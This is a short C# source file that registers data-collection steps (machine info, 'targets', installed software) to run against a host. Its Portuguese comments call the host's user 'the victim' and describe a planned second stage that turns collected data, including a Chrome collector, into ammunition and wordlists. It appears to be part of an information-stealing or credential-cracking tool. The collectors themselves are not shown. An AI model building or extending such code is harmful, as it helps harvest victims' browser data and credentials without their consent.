using Teste.Collect;

namespace Teste.Core;

internal sealed record Step(string Key, Action<Report> Collect);

internal static class Steps
{
    public static IEnumerable<Step> All(Logger log)
    {
        yield return new Step("machine", SystemCollector.Machine);
        yield return new Step("targets", TargetCollector.Collect);
        // software = qual criptografia a vitima usava: prever formato dos alvos
        yield return new Step("software", SystemCollector.Software);

        // etapa 2 (munição/wordlist) — os collectors já estão prontos, só ligados depois:
        // yield return new Step("chrome", r => ChromeCollector.Collect(r, log));
    }
}